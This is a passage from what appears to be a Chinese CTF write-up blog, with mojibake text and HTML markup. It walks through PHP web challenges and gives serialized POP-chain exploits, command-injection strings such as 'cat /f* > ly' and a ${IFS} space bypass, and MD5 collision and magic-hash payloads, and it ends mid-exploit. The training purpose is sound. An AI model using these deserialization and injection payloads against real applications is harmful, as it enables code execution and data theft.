class="hljs-title">re</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chu0</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kw</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;lalalla&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;kw;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pwn</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$over</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># web#__wakup()==&gt;re#__toString()==&gt;pwn#__get()==&gt;Misc#getflag()</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-variable">$a</span>-&gt;kw = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">re</span>();<br><span class="hljs-variable">$a</span>-&gt;kw-&gt;chu0 = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pwn</span>();<br><span class="hljs-variable">$a</span>-&gt;kw-&gt;chu0-&gt;over = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">misc</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment"># O%3A3%3A%22web%22%3A1%3A%7Bs%3A2%3A%22kw%22%3BO%3A2%3A%22re%22%3A1%3A%7Bs%3A4%3A%22chu0%22%3BO%3A3%3A%22pwn%22%3A1%3A%7Bs%3A4%3A%22over%22%3BO%3A4%3A%22Misc%22%3A0%3A%7B%7D%7D%7D%7D</span><br><br></code></pre></td></tr></table></figure><h3 id="ä¸€èµ·åƒè±†è±†"><a href="#ä¸€èµ·åƒè±†è±†" class="headerlink" title="ä¸€èµ·åƒè±†è±†"></a>ä¸€èµ·åƒè±†è±†</h3><p>åœ¨index.jsçš„æºç ä¸­æ£€ç´¢å…³é”®è¯game overå‘ç°</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">atob</span><span class="hljs-params">(<span class="hljs-string">&quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>æ”¾å…¥æ§åˆ¶å°æ‰§è¡Œæˆ–ç›´æ¥å°†base64å­—ç¬¦ä¸²è¿›è¡Œè§£ç </p><h3 id="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"><a href="#ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³" class="headerlink" title="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"></a>ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³</h3><p>å‘½ä»¤æ‰§è¡Œå‡½æ•°shell_exec()æ— å›æ˜¾ï¼Œåˆ©ç”¨é‡å®šå‘ç¬¦<code>&gt;</code>å°†flagå†™å…¥æ–‡ä»¶</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span> /f* &gt; ly</span><br></code></pre></td></tr></table></figure><h3 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h3><p>å¯¹ç©ºæ ¼è¿›è¡Œäº†è¿‡æ»¤</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span>/f*</span><br></code></pre></td></tr></table></figure><h3 id="æ‰€ä»¥ä½ è¯´ä½ æ‡‚MD5ï¼Ÿ"><a href="#æ‰€ä»¥ä½ è¯´ä½ æ‡‚MD5ï¼Ÿ" class="headerlink" title="æ‰€ä»¥ä½ è¯´ä½ æ‡‚MD5ï¼Ÿ"></a>æ‰€ä»¥ä½ è¯´ä½ æ‡‚MD5ï¼Ÿ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5 äº†?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ä»€ä¹ˆ? ä½ ç»•è¿‡å»äº†?</span><br><span class="hljs-comment">// åŠ å¤§å‰‚é‡!</span><br><span class="hljs-comment">// æˆ‘è¦è®©ä»–æˆä¸º string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;éš¾å—?ä¸éš¾!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ä½ è¿˜æ˜¯ç»•è¿‡å»äº†?</span><br><span class="hljs-comment">// å“¦å“¦å“¦, æˆ‘å°‘äº†ä¸€ä¸ªç­‰äºå·</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// ä½ æƒ³çœ‹åˆ° random çš„å€¼å—?</span><br><span class="hljs-comment">// ä½ ä¸æ˜¯å¾ˆæ‡‚ MD5 å—? é‚£æˆ‘å°±å‘Šè¯‰ä½ ä»–çš„ MD5 å§</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¼ªé€ ? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// è®¤è¾“äº†, çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5</span><br><span class="hljs-comment">// é‚£ flag å°±ç»™ä½ å§</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>postä¼ å‚</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">apple<span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span>=<span class="hljs-number">1</span>&amp;banana<span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span>=<span class="hljs-number">2</span>&amp;appple=QLTHNDT&amp;bananana=QNKCDZO&amp;apppple=psycho<span class="hljs-meta">%0A</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00W</span><span class="hljs-meta">%ADZ</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%8A</span><span class="hljs-meta">%13V</span><span class="hljs-meta">%B5</span><span class="hljs-meta">%96</span><span class="hljs-meta">%18m</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%EA2</span><span class="hljs-meta">%81_</span><span class="hljs-meta">%FB</span><span class="hljs-meta">%D9</span><span class="hljs-meta">%24</span><span class="hljs-meta">%22</span><span class="hljs-meta">%2F</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%D4D</span><span class="hljs-meta">%A27vX</span><span class="hljs-meta">%B8</span><span class="hljs-meta">%08</span><span class="hljs-meta">%D7m</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%E0</span><span class="hljs-meta">%D4LR</span><span class="hljs-meta">%D7</span><span class="hljs-meta">%FBo</span><span class="hljs-meta">%10t</span><span class="hljs-meta">%19</span><span class="hljs-meta">%02</span><span class="hljs-meta">%82</span><span class="hljs-meta">%7D</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%9Bt</span><span class="hljs-meta">%05</span><span class="hljs-meta">%FFl</span><span class="hljs-meta">%AE</span><span class="hljs-meta">%8DE</span><span class="hljs-meta">%F4</span><span class="hljs-meta">%1F</span><span class="hljs-meta">%84</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%AE</span><span class="hljs-meta">%01</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%9B</span><span class="hljs-meta">%12</span><span class="hljs-meta">%D4</span><span class="hljs-meta">%81</span><span class="hljs-meta">%A5J</span><span class="hljs-meta">%F9H</span><span class="hljs-meta">%0FyE</span><span class="hljs-meta">%2A</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%B4</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%DEcC</span><span class="hljs-meta">%40</span><span class="hljs-meta">%DA29</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%C3</span><span class="hljs-meta">%00</span><span class="hljs-meta">%7F</span><span class="hljs-meta">%8B_h</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%D3</span><span class="hljs-meta">%8Bd8</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%85</span><span class="hljs-meta">%7C</span><span class="hljs-meta">%14w</span><span class="hljs-meta">%06</span><span class="hljs-meta">%C2</span><span class="hljs-meta">%3AC</span><span class="hljs-meta">%BC</span><span class="hljs-meta">%0C</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%FD</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%98</span><span class="hljs-meta">%CE</span><span class="hljs-meta">%16</span><span class="hljs-meta">%CE</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%F3</span><span class="hljs-meta">%99</span><span class="hljs-meta">%B59</span><span class="hljs-meta">%F9</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%C2</span>&amp;banananana=psycho<span class="hljs-meta">%0A</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00W</span><span class="hljs-meta">%ADZ</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%8A</span><span class="hljs-meta">%13V</span><span class="hljs-meta">%B5</span><span class="hljs-meta">%96</span><span class="hljs-meta">%18m</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%EA2</span><span class="hljs-meta">%81_</span><span class="hljs-meta">%FB</span><span class="hljs-meta">%D9</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%22</span><span class="hljs-meta">%2F</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%D4D</span><span class="hljs-meta">%A27vX</span><span class="hljs-meta">%B8</span><span class="hljs-meta">%08</span><span class="hljs-meta">%D7m</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%E0</span><span class="hljs-meta">%D4LR</span><span class="hljs-meta">%D7</span><span class="hljs-meta">%FBo</span><span class="hljs-meta">%10t</span><span class="hljs-meta">%19</span><span class="hljs-meta">%02</span><span class="hljs-meta">%02</span><span class="hljs-meta">%7E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%9Bt</span><span class="hljs-meta">%05</span><span class="hljs-meta">%FFl</span><span class="hljs-meta">%AE</span><span class="hljs-meta">%8DE</span><span class="hljs-meta">%F4</span><span class="hljs-meta">%1F</span><span class="hljs-meta">%04</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%AE</span><span class="hljs-meta">%01</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%9B</span><span class="hljs-meta">%12</span><span class="hljs-meta">%D4</span><span class="hljs-meta">%81</span><span class="hljs-meta">%A5J</span><span class="hljs-meta">%F9H</span><span class="hljs-meta">%0FyE</span><span class="hljs-meta">%2A</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%B4</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%DEc</span><span class="hljs-meta">%C3</span><span class="hljs-meta">%40</span><span class="hljs-meta">%DA29</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%C3</span><span class="hljs-meta">%00</span><span class="hljs-meta">%7F</span><span class="hljs-meta">%8B_h</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%D3</span><span class="hljs-meta">%8Bd8</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%85</span><span class="hljs-meta">%7C</span><span class="hljs-meta">%14w</span><span class="hljs-meta">%06</span><span class="hljs-meta">%C2</span><span class="hljs-meta">%3AC</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%0C</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%FD</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%98</span><span class="hljs-meta">%CE</span><span class="hljs-meta">%16</span><span class="hljs-meta">%CE</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%F3</span><span class="hljs-meta">%9959</span><span class="hljs-meta">%F9</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%C2</span><span class="hljs-built_in">&amp;name</span>=admin<br></code></pre></td></tr></table></figure><h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;echo 123;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$nature</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>popé“¾</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Nature<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Sea<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span>==&gt;Shark<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Sink<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span><span class="hljs-punctuation">#</span><span class="hljs-keyword">eval</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span 